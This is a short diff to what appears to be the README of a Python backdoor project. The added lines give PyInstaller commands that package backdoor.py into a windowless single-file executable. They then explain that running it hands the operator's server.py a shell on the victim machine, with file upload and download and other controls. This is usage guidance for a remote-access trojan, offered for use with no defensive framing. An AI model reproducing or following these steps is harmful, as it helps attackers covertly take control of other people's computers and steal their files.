@@ -12,4 +12,11 @@ python3 server.py
 Convert backdoor.py into backdoor.exe. 
 There are instractions.
 
+```python
+pip install pyinstaller
+pip install --upgrade pyinstaller
+pyinstaller backdoor.py --onefile --noconsole
 ```
+
+Go into dist directory and run backdoor.exe file, and in your server.py you will get the shell.
+You can use shell commands, upload your files, start videos, download files etc.
